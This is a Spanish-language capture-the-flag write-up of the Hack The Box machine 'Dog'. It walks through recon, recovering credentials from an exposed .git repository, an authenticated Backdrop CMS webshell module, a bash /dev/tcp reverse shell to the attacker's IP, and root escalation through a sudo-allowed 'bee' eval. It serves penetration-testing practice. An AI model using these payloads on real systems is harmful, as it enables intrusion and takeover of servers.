Dog

1. Escaneo de Puertos:
``` bash
‚îå‚îÄ[eu-dedivip-1]‚îÄ[10.10.14.45]‚îÄ[mikjurado1@htb-5vfknfp6s8]‚îÄ[~]
‚îî‚îÄ‚îÄ‚ïº [‚òÖ]$ nmap -sC -sV --top-ports 1000 10.129.4.78
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-02 04:59 CDT
Nmap scan report for 10.129.59.223
Host is up (0.081s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-git: 
|   10.129.59.223:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
|_http-title: Home | Dog
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.75 seconds
‚îå‚îÄ[eu-dedivip-1]‚îÄ[10.10.14.45]‚îÄ[mikjurado1@htb-5vfknfp6s8]‚îÄ[~]
‚îî‚îÄ‚îÄ‚ïº [‚òÖ]$ 

````

2. Escaneo de rutas con gobuster:
```bash
‚îå‚îÄ[eu-dedivip-1]‚îÄ[10.10.14.45]‚îÄ[mikjurado1@htb-5vfknfp6s8]‚îÄ[~]
‚îî‚îÄ‚îÄ‚ïº [‚òÖ]$ gobuster dir -u http://10.129.59.223 --wordlist /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.59.223
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/core                 (Status: 301) [Size: 313] [--> http://10.129.59.223/core/]
/files                (Status: 301) [Size: 314] [--> http://10.129.59.223/files/]
/layouts              (Status: 301) [Size: 316] [--> http://10.129.59.223/layouts/]
/modules              (Status: 301) [Size: 316] [--> http://10.129.59.223/modules/]
/robots.txt           (Status: 200) [Size: 1198]
/server-status        (Status: 403) [Size: 278]
/sites                (Status: 301) [Size: 314] [--> http://10.129.59.223/sites/]
/themes               (Status: 301) [Size: 315] [--> http://10.129.59.223/themes/]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
‚îå‚îÄ[eu-dedivip-1]‚îÄ[10.10.14.45]‚îÄ[mikjurado1@htb-5vfknfp6s8]‚îÄ[~]
‚îî‚îÄ‚îÄ‚ïº [‚òÖ]$ 

````

3. Analizamos la ruta de robots.txt
```

http://10.129.59.223/robots.txt

# robots.txt
#
# This file is to prevent the crawling and indexing of certain parts
# of your site by web crawlers and spiders run by sites like Yahoo!
# and Google. By telling these "robots" where not to go on your site,
# you save bandwidth and server resources.
#
# This file will be ignored unless it is at the root of your host:
# Used:    http://example.com/robots.txt
# Ignored: http://example.com/site/robots.txt
#
# For more information about the robots.txt standard, see:
# http://www.robotstxt.org/robotstxt.html
#
# For syntax checking, see:
# http://www.robotstxt.org/checker.html

User-agent: *
Crawl-delay: 10
# Directories
Disallow: /core/
Disallow: /profiles/
# Files
Disallow: /README.md
Disallow: /web.config
# Paths (clean URLs)
Disallow: /admin
Disallow: /comment/reply
Disallow: /filter/tips
Disallow: /node/add
Disallow: /search
Disallow: /user/register
Disallow: /user/password
Disallow: /user/login
Disallow: /user/logout
# Paths (no clean URLs)
Disallow: /?q=admin
Disallow: /?q=comment/reply
Disallow: /?q=filter/tips
Disallow: /?q=node/add
Disallow: /?q=search
Disallow: /?q=user/password
Disallow: /?q=user/register
Disallow: /?q=user/login
Disallow: /?q=user/logout
````

4. Investigacion del archivo html
```bash
### üîë PISTA CLAVE: `dogBackDropSystem`

Lo m√°s √∫til aqu√≠ es ese nombre. Puedes probarlo de dos maneras:

#### A. **Como usuario en el login**

Se encontro el email: tiffany@dog.htb
````
Opci√≥n 2: Usar `GitTools` (m√°s completo)
**Uso de `gitdumper.sh`**: Antes de usar `extractor.sh`, es recomendable utilizar `gitdumper.sh` para descargar el contenido del directorio `.git/`. 
Este script intenta reconstruir el repositorio localmente a partir de los archivos disponibles. Puedes hacerlo con los siguientes comandos:
```bash
wget https://raw.githubusercontent.com/internetwache/GitTools/master/Dumper/gitdumper.sh

chmod +x gitdumper.sh

./gitdumper.sh http://10.129.4.78/.git/ ./repo


````

**Uso de `extractor.sh`**: Una vez que hayas descargado los archivos con `gitdumper.sh`, puedes utilizar `extractor.sh` para intentar reconstruir el repositorio:
```bash
wget https://raw.githubusercontent.com/internetwache/GitTools/master/Extractor/extractor.sh

chmod +x extractor.sh

./extractor.sh ./repo ./repo_extracted

````

### ‚úÖ Pr√≥ximo paso: buscar credenciales y puntos de entrada

Ahora que tienes el c√≥digo fuente recuperado, deber√≠as enfocarte en encontrar:

#### üîê **Credenciales**

Buscar dentro del repo:
```bash
grep -Ri 'password' ./repo_extracted
grep -Ri 'username' ./repo_extracted
grep -Ri 'DB_' ./repo_extracted

````

Busqueda de informacion de bases de datos en settings.php
```bash

grep -i 'databases' ./repo_extracted/0-8204779c764abd4c9d8d95038b6d22b6a7515afa/settings.php -A 10 > databases.txt

```

üîê **Credenciales de la base de datos**
```bash
mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop

**Desglose:**

- **Usuario**: `root`
    
- **Contrase√±a**: `BackDropJ2024DS2024`
    
- **Host**: `127.0.0.1` (localhost)
    
- **Base de datos**: `backdrop`
````

Probar con varios usuarios
```` 
Usuarios: tiffany@dog.htb
Usuario**: `root`
Contrase√±a**: `BackDropJ2024DS2024`
````

Finalmente se pudo ingresar como:
```bash
Usuarios: tiffany@dog.htb
Contrase√±a**: `BackDropJ2024DS2024`
````


OPCI√ìN 1: Carga de un m√≥dulo malicioso (RCE autenticado)

Backdrop CMS permite a administradores cargar sus propios m√≥dulos:

1. Crear un m√≥dulo PHP con una simple webshell.
    
2. Comprimirlo en `.tar.gz`.
    
3. Subirlo desde el men√∫:  
    `Functionality` ‚Üí `Install new module`

**Ejemplo m√≠nimo de m√≥dulo (webshell):**
```php

<?php
function mymodule_menu() {
  $items['/shell'] = array(
    'page callback' => 'mymodule_shell',
    'access arguments' => array('access content'),
  );
  return $items;
}

function mymodule_shell() {
  if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
  }
}

````

Se encontro a todos los usuarios:
```bash
### üë§ **Usuarios enumerados:**

1. `tiffany`
    
2. `rosa`
    
3. `axel`
    
4. `morris`
    
5. `john`
    
6. `dogBackDropSystem`
    
7. `jobert`
    
8. `JPAdminB`

tiffany@dog.htb

Contrase√±a**: `BackDropJ2024DS2024`
````

Aplicaci√≥n al caso del **m√≥dulo con shell**:

Si vamos a crear un **m√≥dulo (no un theme)** para ejecutar comandos, entonces el archivo `.info` debe seguir esta estructura **m√≠nima y v√°lida** para **un m√≥dulo**:
 `shellmod.info`
```bash
name = ShellMod
type = module
description = A custom backdoor module.
package = Custom
backdrop = 1.x
version = 1.0

````

`shellmod.module`
```bash
<?php

function shellmod_menu() {
  $items['shell'] = array(
    'page callback' => 'shellmod_exec',
    'access arguments' => array('access content'),
  );
  return $items;
}

function shellmod_exec() {
  if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
  } else {
    echo "Usage: ?q=shell&cmd=whoami";
  }
}

````

Empaquetado e instalado:
```bash
tar -czf shellmod.tar.gz shellmod

````

Tenemos como resultado:
```bash
http://10.129.231.223/?q=shell&cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

````

Hemos logrado:

‚úÖ **Instalar el m√≥dulo `shellmod` exitosamente**  
‚úÖ **Obtener ejecuci√≥n remota de comandos (RCE)**  
‚úÖ Confirmar que est√°s ejecutando comandos como el usuario del servidor web (`www-data`)

1. **Obtener una reverse shell**

Para mayor control, lanza esto desde el navegador:
```bash
http://10.129.4.78/?q=shell&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.41/4444+0>%261'

````

Escuchamos con:
```bash
nc -lvnp 4444

Y luego accedemos exitosamente con nuestro reverse shell:
‚îå‚îÄ[eu-dedivip-1]‚îÄ[10.10.14.41]‚îÄ[mikjurado1@htb-ubn3vq6ewl]‚îÄ[~]
‚îî‚îÄ‚îÄ‚ïº [‚òÖ]$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.41] from (UNKNOWN) [10.129.231.223] 51004
bash: cannot set terminal process group (1012): Inappropriate ioctl for device
bash: no job control in this shell
www-data@dog:/var/www/html$ 

````

Buscamos informacion importante:
```bash
whoami
www-data
www-data@dog:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@dog:/var/www/html$ uname -a
uname -a
Linux dog 5.4.0-208-generic #228-Ubuntu SMP Fri Feb 7 19:41:33 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
www-data@dog:/var/www/html$ sudo -l
sudo -l
sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
www-data@dog:/var/www/html$ find / -type f -name "*id_rsa*" 2>/dev/null
find / -type f -name "*id_rsa*" 2>/dev/null
^[[D
www-data@dog:/var/www/html$ 
www-data@dog:/var/www/html$ find / -type f -name "*id_rsa*" 2>/dev/null
find / -type f -name "*id_rsa*" 2>/dev/null
www-data@dog:/var/www/html$ find /home -type f 2>/dev/null | grep -Ei 'pass|cred|user'
<ome -type f 2>/dev/null | grep -Ei 'pass|cred|user'
/home/johncusack/user.txt


````

Dog (Escalada de privilegios)

### üéØ Objetivo

Escalar privilegios desde el usuario `johncusack` hasta `root`.

### üîç Enumeraci√≥n local (www-data)

Desde una shell web (`www-data`) logramos enumerar los usuarios en `/home` y detectar al usuario `johncusack`. El archivo `user.txt` ten√≠a permisos restringidos, as√≠ que era necesario escalar privilegios.

Paso clave: `sudo -l` en `johncusack`
Tras acceder como `johncusack` (mediante las credenciales descubiertas en el CMS):
```
su johncusack
````

Luego, verificamos los privilegios `sudo` disponibles:
```bash
sudo -l
````

 Resultado:
```bash
(ALL) NOPASSWD: /usr/local/bin/bee
````

Esto indica que el usuario puede ejecutar `/usr/local/bin/bee` como **root** sin contrase√±a.

### üêù Escalada de privilegios con `bee`

Ejecutamos el binario:
```bash
sudo /usr/local/bin/bee
````

Dentro de la consola interactiva de `bee`, aprovechamos una funcionalidad cr√≠tica: la posibilidad de evaluar c√≥digo.

En el prompt de `bee`, ejecutamos:
```bash
eval('system("bash")');
````

Esto ejecut√≥ un **shell interactivo como root**.

Verificaci√≥n
```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

````

### üèÅ Flags

- `user.txt` (como `johncusack`)
    
- `root.txt` (tras obtener root con `bee`)

### üí° Lecci√≥n aprendida
    
A veces, **la escalada de privilegios m√°s sencilla** no requiere exploits complejos como PwnKit. Un `sudo -l` puede bastar para detectar accesos cr√≠ticos como este.
